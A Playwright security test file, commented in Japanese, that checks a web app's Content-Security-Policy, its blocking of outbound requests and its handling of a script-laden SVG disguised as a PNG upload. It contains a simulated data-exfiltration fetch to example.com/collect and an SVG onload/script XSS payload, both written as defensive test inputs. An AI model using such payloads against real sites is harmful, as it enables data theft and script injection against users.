/**
 * Phase 11: セキュリティの検証 (CSP・外部通信の禁止・危険なファイルの扱い・URL の入力)。
 */
import { expect, test, type Page } from './fixtures';

async function gotoHash(page: Page, hash: string) {
  await page.evaluate((h) => (window.location.hash = h), hash);
}
async function watchViolations(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
}
const violations = (page: Page) => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

test('[Phase11] CSP：全画面で違反なし・外部への通信と外部のスクリプトは遮断される', async ({ page }) => {
  await watchViolations(page);
  const external: string[] = [];
  page.on('request', (r) => {
    const u = new URL(r.url());
    if (!['localhost', '127.0.0.1'].includes(u.hostname) && !u.protocol.startsWith('blob') && !u.protocol.startsWith('data')) external.push(r.url());
  });
  await page.goto('/');
  await expect(page.getByRole('heading', { name: 'ダッシュボード' })).toBeVisible();
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("default-src 'self'");
  expect(csp).toContain("connect-src 'self'");
  for (const h of ['#/employees', '#/tasks', '#/tasks?view=calendar', '#/helpdesk', '#/helpdesk/new', '#/faq', '#/inventory', '#/documents', '#/documents/new', '#/automation', '#/notifications', '#/data', '#/settings', '#/onboarding']) {
    await gotoHash(page, h);
    await page.waitForLoadState('networkidle');
  }
  expect(await violations(page)).toEqual([]);
  // アプリの通常の動作で外部へ通信しない
  expect(external).toEqual([]);
  // 仮にスクリプトが外部へ送信しようとしても遮断される
  const sent = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'x' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(sent).toBe('blocked');
  const injected = await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__injected = true';
    document.body.appendChild(s);
    return (window as unknown as { __injected?: boolean }).__injected === true;
  });
  expect(injected).toBe(false);
  expect((await violations(page)).some((v) => v.startsWith('connect-src'))).toBe(true);
  expect((await violations(page)).some((v) => v.startsWith('script-src'))).toBe(true);
});

test('[Phase11] 拡張子だけ .png にした SVG（スクリプト入り）を取り込んでも、アプリと同じオリジンで開かれない', async ({ page }) => {
  await page.goto('/');
  await expect(page.getByRole('heading', { name: 'ダッシュボード' })).toBeVisible();
  await gotoHash(page, '#/documents/new');
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="window.top.__pwned=1"><script>window.top.__pwned=1</script></svg>';
  await page.getByTestId('import-file').setInputFiles({ name: 'receipt.png', mimeType: 'image/svg+xml', buffer: Buffer.from(svg) });
  await expect(page).toHaveURL(/#\/documents\/doc_/);
  const mimes = await page.evaluate(async () => {
    const db = await new Promise<IDBDatabase>((r) => {
      const q = indexedDB.open('workcore');
      q.onsuccess = () => r(q.result);
    });
    const rows = await new Promise<{ mime: string }[]>((r) => {
      const q = db.transaction('documentFiles').objectStore('documentFiles').getAll();
      q.onsuccess = () => r(q.result as { mime: string }[]);
    });
    db.close();
    return rows.map((x) => x.mime);
  });
  // ブラウザが報告した image/svg+xml ではなく、安全な画像の種類として保存する
  expect(mimes).not.toContain('image/svg+xml');
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
});
